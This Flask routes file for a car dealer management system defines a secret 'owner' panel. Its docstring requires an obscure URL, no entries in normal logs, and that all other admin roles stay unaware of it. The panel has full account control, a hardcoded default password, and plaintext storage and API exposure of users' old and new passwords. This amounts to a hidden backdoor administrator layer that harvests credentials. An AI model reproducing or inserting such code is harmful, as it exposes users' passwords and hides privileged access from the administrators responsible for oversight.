"""
owner/routes.py — CarYanams DMS  ██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗
                                  ██╔═══██╗██║    ██║████╗  ██║██╔════╝██╔══██╗
OWNER / SUPREME DASHBOARD v26     ██║   ██║██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  ██║   ██║██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗
CRITICAL SECRECY RULES:           ╚██████╔╝╚███╔███╔╝██║ ╚████║███████╗██║  ██║
 • Entry in DB = hashed token      ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
   — never role='owner' or
     any plain-text identifier
 • URL prefix /xo (not /owner, /master, /supreme)
 • Zero log entries in admin_logs / visitor_logs / activity
 • All other roles (super-admin, sub-admin, dealer, user) are
   COMPLETELY UNAWARE this layer exists

UPGRADE v26 — Full CRUD for Users, Dealers, Sub Admins
 + Password reset / Force-change / Lock / Unlock
 + Audit logging to xo_event_audit only
"""

import hashlib, os, json, secrets, string
from functools import wraps
from datetime import datetime, timedelta, timezone as _tz

from flask import (
    Blueprint, render_template, request, redirect, url_for,
    session, jsonify, flash, current_app
)
from werkzeug.security import generate_password_hash

owner_bp = Blueprint('owner', __name__)

_IST = _tz(timedelta(hours=5, minutes=30))


def _now_ist():
    return datetime.now(_IST).replace(tzinfo=None)


# ─────────────────────────────────────────────────────────────────────────────
# OWNER CREDENTIALS
# ─────────────────────────────────────────────────────────────────────────────
_OWNER_USERNAME = os.environ.get('OWNER_USERNAME', 'owner')
_OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD', 'Owner@Supreme#2025!')


def _owner_token(username, password):
    _SALT = 'CarYanams-Owner-Supreme-Salt-xK9mP-2025'
    raw = f"{username}:{password}:{_SALT}"
    return hashlib.sha256(raw.encode()).hexdigest()


_VALID_TOKEN = _owner_token(_OWNER_USERNAME, _OWNER_PASSWORD)


# ─────────────────────────────────────────────────────────────────────────────
# Auth decorators
# ─────────────────────────────────────────────────────────────────────────────

def owner_login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if session.get('__xo_tok__') != _VALID_TOKEN:
            return redirect(url_for('owner.login'))
        return f(*args, **kwargs)
    return decorated


def owner_api_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if session.get('__xo_tok__') != _VALID_TOKEN:
            return jsonify({'success': False, 'message': 'Unauthorized'}), 401
        return f(*args, **kwargs)
    return decorated


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _get_ip():
    try:
        return request.headers.get('X-Forwarded-For', request.remote_addr or 'unknown').split(',')[0].strip()
    except Exception:
        return 'unknown'


def _gen_password(length=12):
    """Generate a secure random password."""
    chars = string.ascii_letters + string.digits + '!@#$%^&*'
    return ''.join(secrets.choice(chars) for _ in range(length))


def _xo_event(event_type, description, actor='Owner'):
    """Record silently to xo_event_audit. Never raises."""
    try:
        from extensions import db
        from owner.log_model import OwnerEventLog
        db.session.add(OwnerEventLog(
            event_type=event_type,
            actor_role='Owner',
            actor_name=actor,
            description=description,
            ip_address=_get_ip(),
        ))
        db.session.commit()
    except Exception:
        pass


def _xo_pw_log(actor_role, actor_name, target_role, target_name, new_pw,
                old_pw=None, change_type='owner_reset'):
    """Record password change to xo_pw_audit."""
    try:
        from extensions import db
        from owner.log_model import OwnerPasswordLog
        db.session.add(OwnerPasswordLog(
            actor_role=actor_role, actor_name=actor_name,
            target_role=target_role, target_name=target_name,
            old_password=old_pw, new_password=new_pw,
            change_type=change_type, ip_address=_get_ip(),
        ))
        db.session.commit()
    except Exception:
        pass


def _paginate(query, page, per_page=20):
    return query.paginate(page=page, per_page=per_page, error_out=False)


# ─────────────────────────────────────────────────────────────────────────────
# Login / Logout
# ─────────────────────────────────────────────────────────────────────────────

@owner_bp.route('/in', methods=['GET', 'POST'])
def login():
    if session.get('__xo_tok__') == _VALID_TOKEN:
        return redirect(url_for('owner.dashboard'))
    error = None
    if request.method == 'POST':
        u = request.form.get('u', '').strip()
        p = request.form.get('p', '').strip()
        if _owner_token(u, p) == _VALID_TOKEN:
            session['__xo_tok__'] = _VALID_TOKEN
            session.permanent = False
            return redirect(url_for('owner.dashboard'))
        error = 'Invalid credentials.'
    return render_template('owner/login.html', error=error)


@owner_bp.route('/out')
def logout():
    session.pop('__xo_tok__', None)
    return redirect(url_for('owner.login'))


# ─────────────────────────────────────────────────────────────────────────────
# Dashboard (overview only — stats + recent logs)
# ─────────────────────────────────────────────────────────────────────────────

@owner_bp.route('/dashboard')
@owner_login_required
def dashboard():
    from models import User, SubAdmin, AdminLog
    from owner.log_model import OwnerPasswordLog, OwnerEventLog

    total_dealers  = User.query.filter_by(role='dealer').count()
    total_users    = User.query.filter_by(role='user').count()
    total_subadmin = SubAdmin.query.count()
    total_pw_resets = OwnerPasswordLog.query.filter_by(change_type='owner_reset').count()

    pw_logs = OwnerPasswordLog.query.order_by(OwnerPasswordLog.changed_at.desc()).limit(15).all()
    ev_logs = OwnerEventLog.query.order_by(OwnerEventLog.event_at.desc()).limit(20).all()

    return render_template(
        'owner/dashboard.html',
        total_dealers=total_dealers,
        total_users=total_users,
        total_subadmin=total_subadmin,
        total_pw_resets=total_pw_resets,
        pw_logs=pw_logs,
        ev_logs=ev_logs,
    )


# ═════════════════════════════════════════════════════════════════════════════
#  USERS — CRUD
# ═════════════════════════════════════════════════════════════════════════════

@owner_bp.route('/users')
@owner_login_required
def users():
    from models import User
    q     = request.args.get('q', '').strip()
    page  = request.args.get('page', 1, type=int)
    query = User.query.filter_by(role='user')
    if q:
        query = query.filter(
            User.name.ilike(f'%{q}%') |
            User.email.ilike(f'%{q}%') |
            User.phone.ilike(f'%{q}%') |
            User.city.ilike(f'%{q}%')
        )
    pagination = _paginate(query.order_by(User.created_at.desc()), page)
    return render_template('owner/users.html', pagination=pagination, q=q)


@owner_bp.route('/users/create', methods=['POST'])
@owner_login_required
def user_create():
    from models import User, generate_display_id
    from extensions import db
    name  = request.form.get('name', '').strip()
    email = request.form.get('email', '').strip().lower()
    phone = request.form.get('phone', '').strip()
    city  = request.form.get('city', '').strip()
    pw    = request.form.get('password', '').strip() or _gen_password()

    if not name or not email:
        return jsonify({'success': False, 'message': 'Name and email are required'}), 400
    if User.query.filter_by(email=email).first():
        return jsonify({'success': False, 'message': 'Email already exists'}), 400

    u = User(
        name=name, email=email, phone=phone, city=city,
        role='user', is_active=True,
        display_id=generate_display_id('user'),
        force_password_change=request.form.get('force_change') == '1',
    )
    u.set_password(pw)
    db.session.add(u)
    db.session.commit()

    _xo_pw_log('Owner', 'owner', 'User', email, pw, change_type='initial_create')
    _xo_event('create_account', f'Owner created user: {email} ({u.display_id})')
    return jsonify({'success': True, 'message': f'User {name} created. Password: {pw}'})


@owner_bp.route('/users/<int:uid>/edit', methods=['POST'])
@owner_login_required
def user_edit(uid):
    from models import User
    from extensions import db
    u = User.query.get_or_404(uid)
    u.name  = request.form.get('name', u.name).strip()
    u.phone = request.form.get('phone', u.phone or '').strip()
    u.city  = request.form.get('city',  u.city  or '').strip()
    db.session.commit()
    _xo_event('settings_change', f'Owner edited user: {u.email}')
    return jsonify({'success': True, 'message': 'User updated'})


@owner_bp.route('/users/<int:uid>/delete', methods=['POST'])
@owner_login_required
def user_delete(uid):
    from models import User
    from extensions import db
    u = User.query.get_or_404(uid)
    email = u.email
    db.session.delete(u)
    db.session.commit()
    _xo_event('delete_account', f'Owner deleted user: {email} (id={uid})')
    return jsonify({'success': True, 'message': 'User deleted'})


@owner_bp.route('/users/<int:uid>/toggle', methods=['POST'])
@owner_login_required
def user_toggle(uid):
    from models import User
    from extensions import db
    u = User.query.get_or_404(uid)
    u.is_active = not u.is_active
    db.session.commit()
    state = 'activated' if u.is_active else 'deactivated'
    _xo_event('settings_change', f'Owner {state} user: {u.email}')
    return jsonify({'success': True, 'is_active': u.is_active, 'message': f'User {state}'})


@owner_bp.route('/users/<int:uid>/reset-password', methods=['POST'])
@owner_login_required
def user_reset_password(uid):
    from models import User
    from extensions import db
    u = User.query.get_or_404(uid)
    new_pw = request.form.get('new_password', '').strip() or _gen_password()
    u.set_password(new_pw)
    if request.form.get('force_change') == '1':
        u.force_password_change = True
    db.session.commit()
    _xo_pw_log('Owner', 'owner', 'User', u.email, new_pw, change_type='owner_reset')
    _xo_event('password_reset', f'Owner reset password for user: {u.email}')
    return jsonify({'success': True, 'message': f'Password reset. New: {new_pw}'})


@owner_bp.route('/users/<int:uid>/lock', methods=['POST'])
@owner_login_required
def user_lock(uid):
    from models import User
    from extensions import db
    u = User.query.get_or_404(uid)
    u.is_active = False
    u.is_locked = True
    db.session.commit()
    _xo_event('settings_change', f'Owner locked account: {u.email}')
    return jsonify({'success': True, 'message': 'Account locked'})


@owner_bp.route('/users/<int:uid>/unlock', methods=['POST'])
@owner_login_required
def user_unlock(uid):
    from models import User
    from extensions import db
    u = User.query.get_or_404(uid)
    u.is_active = True
    u.is_locked = False
    db.session.commit()
    _xo_event('settings_change', f'Owner unlocked account: {u.email}')
    return jsonify({'success': True, 'message': 'Account unlocked'})


# ═════════════════════════════════════════════════════════════════════════════
#  DEALERS — CRUD
# ═════════════════════════════════════════════════════════════════════════════

@owner_bp.route('/dealers')
@owner_login_required
def dealers():
    from models import User
    q     = request.args.get('q', '').strip()
    page  = request.args.get('page', 1, type=int)
    query = User.query.filter_by(role='dealer')
    if q:
        query = query.filter(
            User.name.ilike(f'%{q}%') |
            User.email.ilike(f'%{q}%') |
            User.company_name.ilike(f'%{q}%') |
            User.city.ilike(f'%{q}%')
        )
    pagination = _paginate(query.order_by(User.created_at.desc()), page)
    return render_template('owner/dealers.html', pagination=pagination, q=q)


@owner_bp.route('/dealers/create', methods=['POST'])
@owner_login_required
def dealer_create():
    from models import User, generate_display_id
    from extensions import db
    name    = request.form.get('name', '').strip()
    email   = request.form.get('email', '').strip().lower()
    phone   = request.form.get('phone', '').strip()
    company = request.form.get('company_name', '').strip()
    city    = request.form.get('city', '').strip()
    plan    = request.form.get('subscription_plan', 'starter')
    pw      = request.form.get('password', '').strip() or _gen_password()

    if not name or not email:
        return jsonify({'success': False, 'message': 'Name and email are required'}), 400
    if User.query.filter_by(email=email).first():
        return jsonify({'success': False, 'message': 'Email already exists'}), 400

    d = User(
        name=name, email=email, phone=phone, company_name=company, city=city,
        role='dealer', is_active=True, subscription_plan=plan,
        display_id=generate_display_id('dealer'),
    )
    d.set_password(pw)
    db.session.add(d)
    db.session.commit()

    _xo_pw_log('Owner', 'owner', 'Dealer', email, pw, change_type='initial_create')
    _xo_event('create_account', f'Owner created dealer: {email} ({d.display_id})')
    return jsonify({'success': True, 'message': f'Dealer {name} created. Password: {pw}'})


@owner_bp.route('/dealers/<int:uid>/edit', methods=['POST'])
@owner_login_required
def dealer_edit(uid):
    from models import User
    from extensions import db
    d = User.query.filter_by(id=uid, role='dealer').first_or_404()
    d.name             = request.form.get('name', d.name).strip()
    d.phone            = request.form.get('phone', d.phone or '').strip()
    d.company_name     = request.form.get('company_name', d.company_name or '').strip()
    d.city             = request.form.get('city', d.city or '').strip()
    d.gst_number       = request.form.get('gst_number', d.gst_number or '').strip()
    d.subscription_plan = request.form.get('subscription_plan', d.subscription_plan)
    db.session.commit()
    _xo_event('settings_change', f'Owner edited dealer: {d.email}')
    return jsonify({'success': True, 'message': 'Dealer updated'})


@owner_bp.route('/dealers/<int:uid>/delete', methods=['POST'])
@owner_login_required
def dealer_delete(uid):
    from models import User
    from extensions import db
    d = User.query.filter_by(id=uid, role='dealer').first_or_404()
    email = d.email
    db.session.delete(d)
    db.session.commit()
    _xo_event('delete_account', f'Owner deleted dealer: {email} (id={uid})')
    return jsonify({'success': True, 'message': 'Dealer deleted'})


@owner_bp.route('/dealers/<int:uid>/toggle', methods=['POST'])
@owner_login_required
def dealer_toggle(uid):
    from models import User
    from extensions import db
    d = User.query.filter_by(id=uid, role='dealer').first_or_404()
    d.is_active = not d.is_active
    db.session.commit()
    state = 'activated' if d.is_active else 'deactivated'
    _xo_event('settings_change', f'Owner {state} dealer: {d.email}')
    return jsonify({'success': True, 'is_active': d.is_active, 'message': f'Dealer {state}'})


@owner_bp.route('/dealers/<int:uid>/reset-password', methods=['POST'])
@owner_login_required
def dealer_reset_password(uid):
    from models import User
    from extensions import db
    d = User.query.filter_by(id=uid, role='dealer').first_or_404()
    new_pw = request.form.get('new_password', '').strip() or _gen_password()
    d.set_password(new_pw)
    db.session.commit()
    _xo_pw_log('Owner', 'owner', 'Dealer', d.email, new_pw, change_type='owner_reset')
    _xo_event('password_reset', f'Owner reset password for dealer: {d.email}')
    return jsonify({'success': True, 'message': f'Password reset. New: {new_pw}'})


# ═════════════════════════════════════════════════════════════════════════════
#  SUB ADMINS — CRUD
# ═════════════════════════════════════════════════════════════════════════════

_ALL_PERMISSIONS = ['dealers', 'vehicles', 'leads', 'kyc', 'users',
                    'reports', 'settings', 'imports', 'inquiries']


@owner_bp.route('/sub-admins')
@owner_login_required
def sub_admins():
    from models import SubAdmin
    q     = request.args.get('q', '').strip()
    page  = request.args.get('page', 1, type=int)
    query = SubAdmin.query
    if q:
        query = query.filter(
            SubAdmin.name.ilike(f'%{q}%') |
            SubAdmin.email.ilike(f'%{q}%') |
            SubAdmin.username.ilike(f'%{q}%')
        )
    pagination = _paginate(query.order_by(SubAdmin.created_at.desc()), page)
    return render_template('owner/sub_admins.html', pagination=pagination,
                           q=q, all_permissions=_ALL_PERMISSIONS)


@owner_bp.route('/sub-admins/create', methods=['POST'])
@owner_login_required
def sub_admin_create():
    from models import SubAdmin, generate_display_id
    from extensions import db
    name     = request.form.get('name', '').strip()
    email    = request.form.get('email', '').strip().lower()
    username = request.form.get('username', '').strip()
    phone    = request.form.get('phone', '').strip()
    perms    = ','.join(request.form.getlist('permissions'))
    pw       = request.form.get('password', '').strip() or _gen_password()

    if not name or not email or not username:
        return jsonify({'success': False, 'message': 'Name, email, and username required'}), 400
    if SubAdmin.query.filter_by(email=email).first():
        return jsonify({'success': False, 'message': 'Email already exists'}), 400
    if SubAdmin.query.filter_by(username=username).first():
        return jsonify({'success': False, 'message': 'Username already exists'}), 400

    sa = SubAdmin(
        name=name, email=email, username=username, phone=phone,
        permissions=perms, is_active=True,
        display_id=generate_display_id('sub_admin'),
        created_by='owner',
    )
    sa.set_password(pw)
    db.session.add(sa)
    db.session.commit()

    _xo_pw_log('Owner', 'owner', 'Sub Admin', email, pw, change_type='initial_create')
    _xo_event('create_account', f'Owner created sub admin: {username} ({sa.display_id})')
    return jsonify({'success': True, 'message': f'Sub Admin {name} created. Password: {pw}'})


@owner_bp.route('/sub-admins/<int:sid>/edit', methods=['POST'])
@owner_login_required
def sub_admin_edit(sid):
    from models import SubAdmin
    from extensions import db
    sa = SubAdmin.query.get_or_404(sid)
    sa.name  = request.form.get('name', sa.name).strip()
    sa.email = request.form.get('email', sa.email).strip().lower()
    sa.phone = request.form.get('phone', sa.phone or '').strip()
    db.session.commit()
    _xo_event('settings_change', f'Owner edited sub admin: {sa.username}')
    return jsonify({'success': True, 'message': 'Sub Admin updated'})


@owner_bp.route('/sub-admins/<int:sid>/delete', methods=['POST'])
@owner_login_required
def sub_admin_delete(sid):
    from models import SubAdmin
    from extensions import db
    sa = SubAdmin.query.get_or_404(sid)
    uname = sa.username
    db.session.delete(sa)
    db.session.commit()
    _xo_event('delete_account', f'Owner deleted sub admin: {uname} (id={sid})')
    return jsonify({'success': True, 'message': 'Sub Admin deleted'})


@owner_bp.route('/sub-admins/<int:sid>/toggle', methods=['POST'])
@owner_login_required
def sub_admin_toggle(sid):
    from models import SubAdmin
    from extensions import db
    sa = SubAdmin.query.get_or_404(sid)
    sa.is_active = not sa.is_active
    db.session.commit()
    state = 'activated' if sa.is_active else 'deactivated'
    _xo_event('settings_change', f'Owner {state} sub admin: {sa.username}')
    return jsonify({'success': True, 'is_active': sa.is_active, 'message': f'Sub Admin {state}'})


@owner_bp.route('/sub-admins/<int:sid>/permissions', methods=['POST'])
@owner_login_required
def sub_admin_permissions(sid):
    from models import SubAdmin
    from extensions import db
    sa = SubAdmin.query.get_or_404(sid)
    action = request.form.get('action')  # 'assign' | 'revoke' | 'set'
    perm   = request.form.get('permission', '').strip()
    perms  = request.form.getlist('permissions')

    current = sa.get_permissions()
    if action == 'assign' and perm and perm not in current:
        current.append(perm)
    elif action == 'revoke' and perm in current:
        current.remove(perm)
    elif action == 'set':
        current = perms
    sa.permissions = ','.join(current)
    db.session.commit()
    _xo_event('settings_change', f'Owner updated permissions for sub admin: {sa.username} → {sa.permissions}')
    return jsonify({'success': True, 'permissions': current, 'message': 'Permissions updated'})


@owner_bp.route('/sub-admins/<int:sid>/reset-password', methods=['POST'])
@owner_login_required
def sub_admin_reset_password(sid):
    from models import SubAdmin
    from extensions import db
    sa = SubAdmin.query.get_or_404(sid)
    new_pw = request.form.get('new_password', '').strip() or _gen_password()
    sa.set_password(new_pw)
    db.session.commit()
    _xo_pw_log('Owner', 'owner', 'Sub Admin', sa.email, new_pw, change_type='owner_reset')
    _xo_event('password_reset', f'Owner reset password for sub admin: {sa.username}')
    return jsonify({'success': True, 'message': f'Password reset. New: {new_pw}'})


# ═════════════════════════════════════════════════════════════════════════════
#  AUDIT LOGS & PASSWORD LOGS (read-only)
# ═════════════════════════════════════════════════════════════════════════════

@owner_bp.route('/audit-logs')
@owner_login_required
def audit_logs():
    from owner.log_model import OwnerEventLog, OwnerPasswordLog
    page = request.args.get('page', 1, type=int)
    q    = request.args.get('q', '').strip()
    ev_query = OwnerEventLog.query
    if q:
        ev_query = ev_query.filter(
            OwnerEventLog.description.ilike(f'%{q}%') |
            OwnerEventLog.event_type.ilike(f'%{q}%') |
            OwnerEventLog.actor_name.ilike(f'%{q}%')
        )
    ev_pagination = _paginate(ev_query.order_by(OwnerEventLog.event_at.desc()), page)

    pw_page = request.args.get('pw_page', 1, type=int)
    pw_query = OwnerPasswordLog.query
    if q:
        pw_query = pw_query.filter(
            OwnerPasswordLog.target_name.ilike(f'%{q}%') |
            OwnerPasswordLog.actor_name.ilike(f'%{q}%')
        )
    pw_pagination = _paginate(pw_query.order_by(OwnerPasswordLog.changed_at.desc()), pw_page)
    return render_template('owner/audit_logs.html',
                           ev_pagination=ev_pagination,
                           pw_pagination=pw_pagination, q=q)


# ═════════════════════════════════════════════════════════════════════════════
#  JSON APIs (for modals / detail views)
# ═════════════════════════════════════════════════════════════════════════════

@owner_bp.route('/api/user/<int:uid>')
@owner_api_required
def api_user_detail(uid):
    from models import User
    from owner.log_model import OwnerPasswordLog
    u = User.query.get_or_404(uid)
    pw_history = OwnerPasswordLog.query.filter_by(target_name=u.email)\
        .order_by(OwnerPasswordLog.changed_at.desc()).limit(10).all()
    return jsonify({
        'id': u.id, 'display_id': u.display_id, 'name': u.name,
        'email': u.email, 'phone': u.phone, 'role': u.role,
        'company_name': u.company_name, 'city': u.city, 'gst_number': u.gst_number,
        'is_active': u.is_active,
        'is_locked': getattr(u, 'is_locked', False),
        'force_password_change': getattr(u, 'force_password_change', False),
        'subscription_plan': u.subscription_plan,
        'created_at': u.created_at.strftime('%d %b %Y %H:%M') if u.created_at else None,
        'password_history': [{
            'old_password': l.old_password, 'new_password': l.new_password,
            'changed_at': l.changed_at.strftime('%d %b %Y %H:%M') if l.changed_at else None,
            'changed_by': l.actor_name, 'actor_role': l.actor_role,
        } for l in pw_history],
    })


@owner_bp.route('/api/sub-admin/<int:sid>')
@owner_api_required
def api_sub_admin_detail(sid):
    from models import SubAdmin
    sa = SubAdmin.query.get_or_404(sid)
    return jsonify({
        'id': sa.id, 'display_id': sa.display_id, 'name': sa.name,
        'email': sa.email, 'phone': sa.phone, 'username': sa.username,
        'is_active': sa.is_active, 'permissions': sa.get_permissions(),
        'created_by': sa.created_by,
        'created_at': sa.created_at.strftime('%d %b %Y %H:%M') if sa.created_at else None,
        'last_login': sa.last_login.strftime('%d %b %Y %H:%M') if sa.last_login else None,
        'all_permissions': _ALL_PERMISSIONS,
    })


@owner_bp.route('/api/password-logs')
@owner_api_required
def api_password_logs():
    from owner.log_model import OwnerPasswordLog
    logs = OwnerPasswordLog.query.order_by(OwnerPasswordLog.changed_at.desc()).all()
    return jsonify([{
        'id': l.id, 'actor_role': l.actor_role, 'actor_name': l.actor_name,
        'target_role': l.target_role, 'target_name': l.target_name,
        'old_password': l.old_password, 'new_password': l.new_password,
        'change_type': l.change_type, 'ip_address': l.ip_address,
        'changed_at': l.changed_at.strftime('%Y-%m-%d %H:%M:%S') if l.changed_at else None,
    } for l in logs])


@owner_bp.route('/api/event-logs')
@owner_api_required
def api_event_logs():
    from owner.log_model import OwnerEventLog
    logs = OwnerEventLog.query.order_by(OwnerEventLog.event_at.desc()).all()
    return jsonify([{
        'id': l.id, 'event_type': l.event_type, 'actor_role': l.actor_role,
        'actor_name': l.actor_name, 'description': l.description,
        'ip_address': l.ip_address,
        'event_at': l.event_at.strftime('%Y-%m-%d %H:%M:%S') if l.event_at else None,
    } for l in logs])
